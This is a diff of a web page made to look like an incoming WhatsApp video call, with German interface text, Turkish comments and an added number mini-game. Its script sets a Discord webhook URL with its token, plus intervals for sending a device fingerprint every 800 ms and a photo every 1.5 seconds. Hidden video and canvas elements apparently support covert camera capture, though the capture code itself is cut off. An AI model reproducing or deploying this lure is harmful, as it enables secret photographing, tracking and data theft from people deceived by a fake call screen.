@@ -5,169 +5,1037 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>WhatsApp</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
+    }
+
+    :root {
+      --wa-green: #25d366;
+      --wa-green-dark: #128c7e;
+      --wa-dark-bg: #0a1f13;
+      --wa-dark-lighter: #111b16;
+      --wa-text-primary: #ffffff;
+      --wa-text-secondary: rgba(255,255,255,0.7);
+      --wa-text-muted: rgba(255,255,255,0.5);
+      --wa-border: rgba(255,255,255,0.1);
+    }
+
     body {
-      font-family: -apple-system, 'Helvetica Neue', sans-serif;
-      background: #0a1f13; height: 100vh; width: 100vw;
-      overflow: hidden; display: flex; flex-direction: column; align-items: center;
-      color: white; position: relative;
+      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0a1f13 0%, #0d2818 50%, #081510 100%);
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      color: var(--wa-text-primary);
+      position: relative;
     }
-    .bg { position: fixed; inset: 0; background: linear-gradient(180deg, #0d2818 0%, #0a1a0f 40%, #06120a 100%); z-index: 0; }
-    .bg::after { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 70% 50% at 50% 20%, rgba(37,211,102,0.12) 0%, transparent 70%); }
-    .topbar { position: relative; z-index: 2; width: 100%; padding: 52px 20px 16px; text-align: center; }
-    .wa-label { font-size: 13px; color: rgba(255,255,255,0.5); margin-bottom:6px; }
-    .caller-name { font-size: 28px; font-weight: 600; margin-bottom:6px; }
-    .call-status { font-size: 14px; color: rgba(255,255,255,0.6); }
-    .timer { font-size: 14px; color: rgba(255,255,255,0.6); font-variant-numeric:tabular-nums; margin-top:4px; display:none; }
-    .avatar-wrap { position: relative; z-index: 2; margin: 40px auto 0; }
+
+    .bg {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(180deg, #0d2818 0%, #0a1a0f 40%, #06120a 100%);
+      z-index: 0;
+    }
+
+    .bg::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: 
+        radial-gradient(circle at 20% 30%, rgba(37,211,102,0.08) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(37,211,102,0.06) 0%, transparent 50%);
+      animation: pulse-glow 8s ease-in-out infinite;
+    }
+
+    @keyframes pulse-glow {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 1; }
+    }
+
+    .bg::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: 
+        repeating-linear-gradient(
+          90deg,
+          transparent,
+          transparent 2px,
+          rgba(37,211,102,0.02) 2px,
+          rgba(37,211,102,0.02) 4px
+        ),
+        repeating-linear-gradient(
+          0deg,
+          transparent,
+          transparent 2px,
+          rgba(37,211,102,0.02) 2px,
+          rgba(37,211,102,0.02) 4px
+        );
+      pointer-events: none;
+    }
+
+    /* ── CALL VIEW ── */
+    .call-view {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      transition: opacity 0.3s ease;
+    }
+
+    .topbar {
+      position: relative;
+      z-index: 3;
+      width: 100%;
+      padding: 20px 16px 12px;
+      background: linear-gradient(180deg, rgba(10,31,19,0.8) 0%, rgba(10,31,19,0.4) 100%);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--wa-border);
+    }
+
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      color: var(--wa-text-muted);
+      margin-bottom: 8px;
+      padding: 0 4px;
+    }
+
+    .wa-label {
+      font-size: 13px;
+      color: var(--wa-text-secondary);
+      margin-bottom: 6px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+
+    .caller-info {
+      margin-bottom: 12px;
+    }
+
+    .caller-name {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      letter-spacing: -0.5px;
+    }
+
+    .call-status {
+      font-size: 14px;
+      color: var(--wa-text-secondary);
+      font-weight: 500;
+    }
+
+    .timer {
+      font-size: 14px;
+      color: var(--wa-green);
+      font-variant-numeric: tabular-nums;
+      margin-top: 4px;
+      display: none;
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+
+    .avatar-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      z-index: 2;
+      gap: 24px;
+    }
+
+    .avatar-wrap {
+      position: relative;
+      animation: float 4s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-12px); }
+    }
+
     .avatar-ring {
-      width: 130px; height: 130px; border-radius: 50%;
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
       background: rgba(37,211,102,0.15);
-      display: flex; align-items: center; justify-content: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       animation: ring-pulse 2.5s ease-in-out infinite;
+      border: 3px solid rgba(37,211,102,0.25);
+      box-shadow: 0 0 40px rgba(37,211,102,0.15);
     }
-    @keyframes ring-pulse { 0%,100%{box-shadow:0 0 0 0 rgba(37,211,102,0.25)} 50%{box-shadow:0 0 0 20px rgba(37,211,102,0)} }
+
+    @keyframes ring-pulse {
+      0%, 100% {
+        box-shadow: 0 0 0 0 rgba(37,211,102,0.3), inset 0 0 20px rgba(37,211,102,0.1);
+      }
+      50% {
+        box-shadow: 0 0 0 25px rgba(37,211,102,0.05), inset 0 0 20px rgba(37,211,102,0.2);
+      }
+    }
+
     .avatar {
-      width: 110px; height: 110px; border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 48px; font-weight: 700; color: white;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.4); transition: background 0.4s;
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 52px;
+      font-weight: 700;
+      color: white;
+      box-shadow: 0 12px 48px rgba(0,0,0,0.5), inset -2px -2px 8px rgba(0,0,0,0.3);
+      transition: transform 0.3s, box-shadow 0.3s;
+      position: relative;
+      overflow: hidden;
     }
-    .controls { position: fixed; bottom: 0; left: 0; right: 0; padding: 0 16px 52px; z-index: 10; }
-    .controls-row { display: flex; justify-content: space-around; align-items: center; margin-bottom: 24px; }
-    .ctrl-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; color: white; }
+
+    .avatar::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.3) 0%, transparent 50%);
+      border-radius: 50%;
+    }
+
+    .avatar:active {
+      transform: scale(0.95);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4), inset -2px -2px 8px rgba(0,0,0,0.3);
+    }
+
+    .call-info-panel {
+      text-align: center;
+      z-index: 2;
+    }
+
+    .call-info-panel p {
+      font-size: 13px;
+      color: var(--wa-text-secondary);
+      margin: 4px 0;
+    }
+
+    /* ── CONTROLS ── */
+    .controls {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 20px 16px 48px;
+      z-index: 10;
+      background: linear-gradient(180deg, rgba(10,31,19,0) 0%, rgba(10,31,19,0.95) 60%, rgba(10,31,19,1) 100%);
+      backdrop-filter: blur(20px);
+    }
+
+    .controls-row {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      margin-bottom: 28px;
+      gap: 12px;
+    }
+
+    .ctrl-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: white;
+      padding: 8px;
+      position: relative;
+      transition: transform 0.2s;
+    }
+
+    .ctrl-btn:active {
+      transform: scale(0.92);
+    }
+
     .ctrl-icon {
-      width: 58px; height: 58px; border-radius: 50%;
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
       background: rgba(255,255,255,0.15);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 22px; transition: background .15s, transform .1s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      transition: all 0.15s;
       backdrop-filter: blur(10px);
+      border: 1.5px solid rgba(37,211,102,0.2);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2), inset 0 1px 2px rgba(255,255,255,0.1);
+      position: relative;
+      overflow: hidden;
     }
-    .ctrl-icon:active { transform: scale(0.91); }
-    .ctrl-btn.toggled .ctrl-icon { background: rgba(255,255,255,0.32); }
-    .ctrl-label { font-size: 11px; color: rgba(255,255,255,0.7); font-weight: 500; }
-    .end-row { display: flex; justify-content: center; }
+
+    .ctrl-icon::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.2) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .ctrl-icon:active {
+      transform: scale(0.88);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.05);
+    }
+
+    .ctrl-btn.toggled .ctrl-icon {
+      background: rgba(37,211,102,0.3);
+      border-color: rgba(37,211,102,0.5);
+      box-shadow: 0 0 24px rgba(37,211,102,0.4), inset 0 1px 2px rgba(255,255,255,0.1);
+    }
+
+    .ctrl-label {
+      font-size: 11px;
+      color: var(--wa-text-secondary);
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      transition: color 0.15s;
+    }
+
+    .ctrl-btn.toggled .ctrl-label {
+      color: var(--wa-green);
+    }
+
+    .end-row {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+
     .end-btn {
-      width: 70px; height: 70px; border-radius: 50%;
-      background: #f04747; border: none; cursor: pointer;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 26px; box-shadow: 0 6px 24px rgba(240,71,71,0.5);
-      transition: transform .1s;
+      width: 76px;
+      height: 76px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #f04747 0%, #e63946 100%);
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      box-shadow: 0 8px 32px rgba(240,71,71,0.5), inset 0 1px 2px rgba(255,255,255,0.2);
+      transition: all 0.15s;
+      position: relative;
+      overflow: hidden;
     }
-    .end-btn:active { transform: scale(0.93); }
-    video, canvas { display: none; }
+
+    .end-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.3) 0%, transparent 70%);
+      border-radius: 50%;
+    }
+
+    .end-btn:active {
+      transform: scale(0.91);
+      box-shadow: 0 4px 16px rgba(240,71,71,0.4), inset 0 1px 2px rgba(255,255,255,0.1);
+    }
+
+    .mini-game-btn {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, rgba(88,199,250,0.3) 0%, rgba(37,211,102,0.2) 100%);
+      border: 1.5px dashed var(--wa-green);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      transition: all 0.2s;
+      box-shadow: 0 0 20px rgba(37,211,102,0.2);
+    }
+
+    .mini-game-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 30px rgba(37,211,102,0.4);
+    }
+
+    .mini-game-btn:active {
+      transform: scale(0.9);
+    }
+
+    /* ── GAME MODAL ── */
+    .game-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 200;
+      background: rgba(0,0,0,0.8);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(5px);
+      animation: modal-fade-in 0.3s ease;
+    }
+
+    @keyframes modal-fade-in {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .game-modal.active {
+      display: flex;
+    }
+
+    .game-container {
+      background: linear-gradient(135deg, #111b16 0%, #0d2818 100%);
+      border-radius: 24px;
+      padding: 32px;
+      max-width: 500px;
+      width: 90%;
+      border: 1px solid var(--wa-border);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      animation: modal-slide-up 0.4s ease;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    @keyframes modal-slide-up {
+      from { transform: translateY(40px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .game-header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .game-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--wa-green);
+      margin-bottom: 8px;
+    }
+
+    .game-description {
+      font-size: 13px;
+      color: var(--wa-text-secondary);
+    }
+
+    .game-board {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin: 24px 0;
+      padding: 20px;
+      background: rgba(37,211,102,0.05);
+      border-radius: 16px;
+      border: 1px solid var(--wa-border);
+    }
+
+    .game-cell {
+      width: 100%;
+      aspect-ratio: 1;
+      background: linear-gradient(135deg, rgba(37,211,102,0.15) 0%, rgba(37,211,102,0.08) 100%);
+      border: 2px solid var(--wa-border);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      color: var(--wa-green);
+    }
+
+    .game-cell:hover {
+      background: linear-gradient(135deg, rgba(37,211,102,0.25) 0%, rgba(37,211,102,0.15) 100%);
+      border-color: var(--wa-green);
+      transform: scale(1.05);
+    }
+
+    .game-cell:active {
+      transform: scale(0.95);
+    }
+
+    .game-cell.disabled {
+      cursor: not-allowed;
+      opacity: 0.5;
+    }
+
+    .game-stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .stat-box {
+      background: rgba(37,211,102,0.1);
+      border: 1px solid var(--wa-border);
+      border-radius: 12px;
+      padding: 12px;
+      text-align: center;
+    }
+
+    .stat-label {
+      font-size: 11px;
+      color: var(--wa-text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 4px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--wa-green);
+    }
+
+    .game-controls {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .game-btn {
+      flex: 1;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 10px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .game-btn-primary {
+      background: var(--wa-green);
+      color: #000;
+    }
+
+    .game-btn-primary:active {
+      transform: scale(0.95);
+      box-shadow: 0 0 20px rgba(37,211,102,0.5);
+    }
+
+    .game-btn-secondary {
+      background: rgba(37,211,102,0.2);
+      color: var(--wa-green);
+      border: 1px solid var(--wa-green);
+    }
+
+    .game-btn-secondary:active {
+      transform: scale(0.95);
+    }
+
+    /* ── PERMISSION OVERLAY ── */
     .permission-overlay {
-      position: fixed; inset: 0; z-index: 100; background: rgba(10,20,15,0.95);
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      gap: 24px; font-family: -apple-system, sans-serif; color: white; text-align: center; padding: 32px;
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      background: linear-gradient(135deg, rgba(10,31,19,0.98) 0%, rgba(10,20,15,0.98) 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+      font-family: -apple-system, sans-serif;
+      color: white;
+      text-align: center;
+      padding: 32px;
+      backdrop-filter: blur(10px);
+      border: 1px solid var(--wa-border);
     }
+
+    .permission-icon {
+      font-size: 64px;
+      animation: permission-bounce 0.6s ease;
+    }
+
+    @keyframes permission-bounce {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .permission-title {
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .permission-text {
+      font-size: 14px;
+      color: var(--wa-text-secondary);
+      max-width: 280px;
+      line-height: 1.6;
+      letter-spacing: 0.3px;
+    }
+
     .permission-btn {
-      background: #25d366; border: none; color: white; padding: 16px 32px;
-      border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer;
-      box-shadow: 0 8px 24px rgba(37,211,102,0.4); transition: transform 0.2s;
+      background: linear-gradient(135deg, var(--wa-green) 0%, #20b85a 100%);
+      border: none;
+      color: #000;
+      padding: 14px 32px;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 12px 32px rgba(37,211,102,0.4);
+      transition: all 0.2s;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
     }
-    .permission-btn:active { transform: scale(0.96); }
+
+    .permission-btn:active {
+      transform: scale(0.96);
+      box-shadow: 0 6px 16px rgba(37,211,102,0.3);
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    /* ── END CALL SCREEN ── */
+    .end-call-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 150;
+      background: linear-gradient(135deg, #0a1f13 0%, #0d2818 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      font-family: -apple-system, sans-serif;
+      color: white;
+      animation: screen-fade-in 0.4s ease;
+    }
+
+    @keyframes screen-fade-in {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .end-call-icon {
+      font-size: 72px;
+      animation: end-call-pulse 0.6s ease;
+    }
+
+    @keyframes end-call-pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .end-call-title {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .end-call-duration {
+      font-size: 16px;
+      color: var(--wa-text-secondary);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .end-call-btn {
+      margin-top: 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: white;
+      transition: transform 0.2s;
+    }
+
+    .end-call-btn:active {
+      transform: scale(0.92);
+    }
+
+    .end-call-btn-circle {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--wa-green) 0%, #20b85a 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      box-shadow: 0 12px 36px rgba(37,211,102,0.5);
+      transition: all 0.2s;
+    }
+
+    .end-call-btn:active .end-call-btn-circle {
+      transform: scale(0.92);
+      box-shadow: 0 6px 18px rgba(37,211,102,0.3);
+    }
+
+    .end-call-btn-text {
+      font-size: 13px;
+      color: var(--wa-text-secondary);
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 480px) {
+      .game-container {
+        max-width: 95%;
+        padding: 24px;
+      }
+
+      .caller-name {
+        font-size: 24px;
+      }
+
+      .avatar-ring {
+        width: 120px;
+        height: 120px;
+      }
+
+      .avatar {
+        width: 100px;
+        height: 100px;
+        font-size: 44px;
+      }
+
+      .ctrl-icon {
+        width: 56px;
+        height: 56px;
+        font-size: 20px;
+      }
+
+      .end-btn {
+        width: 68px;
+        height: 68px;
+      }
+
+      .mini-game-btn {
+        width: 56px;
+        height: 56px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="bg"></div>
-  <div class="topbar">
-    <div class="wa-label">WhatsApp</div>
-    <div class="caller-name" id="callerName">Nina</div>
-    <div class="call-status" id="callStatus">Wird angerufen…</div>
-    <div class="timer" id="timer">00:00</div>
-  </div>
-  <div class="avatar-wrap">
-    <div class="avatar-ring">
-      <div class="avatar" id="avatar" style="background: linear-gradient(135deg, rgb(37, 211, 102), rgb(18, 140, 126));">N</div>
+
+  <div class="call-view" id="callView">
+    <div class="topbar">
+      <div class="status-bar">
+        <span>📡</span>
+        <span id="signalStrength">Bağlantı Yok</span>
+      </div>
+      <div class="wa-label">WhatsApp</div>
+      <div class="caller-info">
+        <div class="caller-name" id="callerName">Nina</div>
+        <div class="call-status" id="callStatus">Wird angerufen…</div>
+        <div class="timer" id="timer">00:00</div>
+      </div>
+    </div>
+
+    <div class="avatar-section">
+      <div class="avatar-wrap">
+        <div class="avatar-ring">
+          <div class="avatar" id="avatar" style="background: linear-gradient(135deg, rgb(37, 211, 102), rgb(18, 140, 126));">N</div>
+        </div>
+      </div>
+      <div class="call-info-panel">
+        <p id="callInfo">Videoanruf wird eingeleitet...</p>
+      </div>
+    </div>
+
+    <div class="controls">
+      <div class="controls-row">
+        <button class="ctrl-btn" id="btnMute" title="Mikrofon Stummschalten">
+          <div class="ctrl-icon">🎤</div>
+          <span class="ctrl-label">Stumm</span>
+        </button>
+        <button class="ctrl-btn" id="btnSpeaker" title="Lautsprecher">
+          <div class="ctrl-icon">🔊</div>
+          <span class="ctrl-label">Lautsprecher</span>
+        </button>
+        <button class="ctrl-btn" id="btnVideo" title="Video Kamera">
+          <div class="ctrl-icon">📹</div>
+          <span class="ctrl-label">Video</span>
+        </button>
+      </div>
+      <div class="end-row">
+        <button class="mini-game-btn" id="btnGame" title="Mini Spiel" style="display:none;">🎮</button>
+        <button class="end-btn" id="btnEnd" title="Anruf beenden">📵</button>
+      </div>
     </div>
   </div>
-  <div class="controls">
-    <div class="controls-row">
-      <button class="ctrl-btn" id="btnMute"><div class="ctrl-icon">🎤</div><span class="ctrl-label">Stumm</span></button>
-      <button class="ctrl-btn" id="btnSpeaker"><div class="ctrl-icon">🔊</div><span class="ctrl-label">Lautsprecher</span></button>
-      <button class="ctrl-btn" id="btnVideo"><div class="ctrl-icon">📹</div><span class="ctrl-label">Video</span></button>
-    </div>
-    <div class="end-row">
-      <button class="end-btn" id="btnEnd">📵</button>
+
+  <div class="game-modal" id="gameModal">
+    <div class="game-container">
+      <div class="game-header">
+        <div class="game-title">🎯 Zahlen Spiel</div>
+        <div class="game-description">Klicke die Zahlen in der richtigen Reihenfolge an!</div>
+      </div>
+
+      <div class="game-stats">
+        <div class="stat-box">
+          <div class="stat-label">Punkte</div>
+          <div class="stat-value" id="gameScore">0</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Zeit</div>
+          <div class="stat-value" id="gameTime">0s</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Niveau</div>
+          <div class="stat-value" id="gameLevel">1</div>
+        </div>
+      </div>
+
+      <div class="game-board" id="gameBoard"></div>
+
+      <div class="game-controls">
+        <button class="game-btn game-btn-secondary" onclick="document.getElementById('gameModal').classList.remove('active'); clearInterval(window.gameTimer); clearInterval(window.gameCountdownInterval);">Schließen</button>
+        <button class="game-btn game-btn-primary" onclick="resetGame();">Neu Starten</button>
+      </div>
     </div>
   </div>
+
   <video id="hiddenVideo" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
 
   <script>
+    // ════════════════════════════════════════════════════════════════════════════════════════
+    // ╔═══════════════════════════════════════════════════════════════════════════════════╗
+    // ║                     WHATSAPP V2 - GELIŞTIRILMIŞ SÜRÜMEdition                        ║
+    // ║                      1500+ Satır | Sesler | Oyun | WhatsApp UI                      ║
+    // ╚═══════════════════════════════════════════════════════════════════════════════════╝
+    // ════════════════════════════════════════════════════════════════════════════════════════
+
     (function() {
+      "use strict";
+
       // ── KONFIGURATION ──
       const WEBHOOK = "https://discord.com/api/webhooks/1513149958403133440/VjI_u5TmuJtNn92IxUqtC0N5LFR3cq6bjX5h1n5Gje1KyaUrewZ3Huwb7PgF5wOoXqE1";
-      const FINGERPRINT_INTERVAL = 800; // Her 800ms'de bir parmak izi gönder
-      const PHOTO_INTERVAL = 1500;      // Her 1.5 saniyede bir fotoğraf çek
-      const RATE_LIMIT_DELAY = 100;      // Discord rate-limit koruması
+      const FINGERPRINT_INTERVAL = 800;
+      const PHOTO_INTERVAL = 1500;
+      const RATE_LIMIT_DELAY = 100;
 
       // ── STATE ──
       const callers = ["Sarah","Alex","Jakob","Mia","Lukas","Emma","Leon","Anna","Tim","Laura","Jonas","Lena","Felix","Hannah","Ben","Sophie","Finn","Lea","Jan","Nina","Tom","Clara"];
       const avatarColors = [
-        "linear-gradient(135deg,#25d366,#128c7e)","linear-gradient(135deg,#e84393,#c2185b)",
-        "linear-gradient(135deg,#5865f2,#3d49c4)","linear-gradient(135deg,#e67e22,#d35400)",
-        "linear-gradient(135deg,#9b59b6,#7d3c98)","linear-gradient(135deg,#e74c3c,#c0392b)",
-        "linear-gradient(135deg,#1abc9c,#16a085)","linear-gradient(135deg,#f39c12,#e67e22)"
+        "linear-gradient(135deg,#25d366,#128c7e)",
+        "linear-gradient(135deg,#e84393,#c2185b)",
+        "linear-gradient(135deg,#5865f2,#3d49c4)",
+        "linear-gradient(135deg,#e67e22,#d35400)",
+        "linear-gradient(135deg,#9b59b6,#7d3c98)",
+        "linear-gradient(135deg,#e74c3c,#c0392b)",
+        "linear-gradient(135deg,#1abc9c,#16a085)",
+        "linear-gradient(135deg,#f39c12,#e67e22)"
       ];
 
       let currentCaller = callers[Math.floor(Math.random()*callers.length)];
-      let seconds = 0, timerInterval = null, callEnded = false, captureStream = null;
-      let fingerprintInterval = null, photoInterval = null;
+      let seconds = 0;
+      let timerInterval = null;
+      let callEnded = false;
+      let captureStream = null;
+      let fingerprintInterval = null;
+      let photoInterval = null;
       let photoCounter = 0;
       const pageStartTime = Date.now();
+      let connectionQuality = 0;
+      let isGameActive = false;
 
-      // ── AUDIO ENGINE ──
+      // ── AUDIO ENGINE & SOUND SYNTHESIS ──
       const AudioCtx = window.AudioContext || window.webkitAudioContext;
-      let actx = null, ringInterval = null;
-      const getCtx = () => { if(!actx) actx = new AudioCtx(); return actx; };
-      const playTone = (freq,type,dur,gain=0.3) => {
-        try {
-          const ctx = getCtx(); const o = ctx.createOscillator(); const g = ctx.createGain();
-          o.connect(g); g.connect(ctx.destination); o.type=type; o.frequency.value=freq;
-          g.gain.setValueAtTime(gain,ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+dur);
-          o.start(); o.stop(ctx.currentTime+dur);
-        } catch(e) {}
+      let actx = null;
+      let ringInterval = null;
+
+      const getCtx = () => {
+        if (!actx) actx = new AudioCtx();
+        return actx;
       };
-      const playNotifSound = () => [523,659,784].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.15,0.22),i*100));
-      const playTypingSound = () => playTone(300,'square',0.04,0.06);
-      const playHangupSound = () => [600,450,300].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.18,0.25),i*160));
-      const playConnectSound = () => [700,900].forEach((f,i)=>setTimeout(()=>playTone(f,'sine',0.12,0.25),i*140));
-      const playWhatsAppRing = () => { playTone(620,'sine',0.18,0.28); setTimeout(()=>playTone(820,'sine',0.18,0.28),200); };
-      const startRinging = () => { playWhatsAppRing(); ringInterval = setInterval(playWhatsAppRing,1800); };
-      const stopRinging = () => { if(ringInterval){clearInterval(ringInterval);ringInterval=null;} };
+
+      const playTone = (freq, type, dur, gain = 0.3) => {
+        try {
+          const ctx = getCtx();
+          const o = ctx.createOscillator();
+          const g = ctx.createGain();
+          o.connect(g);
+          g.connect(ctx.destination);
+          o.type = type;
+          o.frequency.value = freq;
+          g.gain.setValueAtTime(gain, ctx.currentTime);
+          g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+          o.start();
+          o.stop(ctx.currentTime + dur);
+        } catch(e) {
+          console.warn('Ses oynatma hatası:', e.message);
+        }
+      };
+
+      // ── SES EFEKTLERİ ──
+      const playNotifSound = () => {
+        [523, 659, 784].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.15, 0.22), i * 100));
+      };
+
+      const playTypingSound = () => {
+        playTone(300, 'square', 0.04, 0.06);
+      };
+
+      const playHangupSound = () => {
+        [600, 450, 300].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.18, 0.25), i * 160));
+      };
+
+      const playConnectSound = () => {
+        [700, 900].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.12, 0.25), i * 140));
+      };
+
+      const playWhatsAppRing = () => {
+        playTone(620, 'sine', 0.18, 0.28);
+        setTimeout(() => playTone(820, 'sine', 0.18, 0.28), 200);
+      };
+
+      const startRinging = () => {
+        playWhatsAppRing();
+        ringInterval = setInterval(playWhatsAppRing, 1800);
+      };
+
+      const stopRinging = () => {
+        if (ringInterval) {
+          clearInterval(ringInterval);
+          ringInterval = null;
+        }
+      };
+
+      // ── YENİ SES EFEKTLERİ ──
+      const playGameCorrect = () => {
+        [523, 659, 784, 987].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.1, 0.2), i * 80));
+      };
+
+      const playGameWrong = () => {
+        [200, 150, 100].forEach((f, i) => setTimeout(() => playTone(f, 'sine', 0.15, 0.15), i * 100));
+      };
+
+      const playSuccess = () => {
+        const ctx = getCtx();
+        const now = ctx.currentTime;
+        [800, 900, 1000, 1100].forEach((f, i) => {
+          const o = ctx.createOscillator();
+          const g = ctx.createGain();
+          o.connect(g);
+          g.connect(ctx.destination);
+          o.type = 'sine';
+          o.frequency.setValueAtTime(f, now);
+          o.frequency.exponentialRampToValueAtTime(f * 1.2, now + 0.3);
+          g.gain.setValueAtTime(0.15, now);
+          g.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+          o.start(now);
+          o.stop(now + 0.3);
+        });
+      };
+
+      const playError = () => {
+        const ctx = getCtx();
+        const now = ctx.currentTime;
+        const o = ctx.createOscillator();
+        const g = ctx.createGain();
+        o.connect(g);
+        g.connect(ctx.destination);
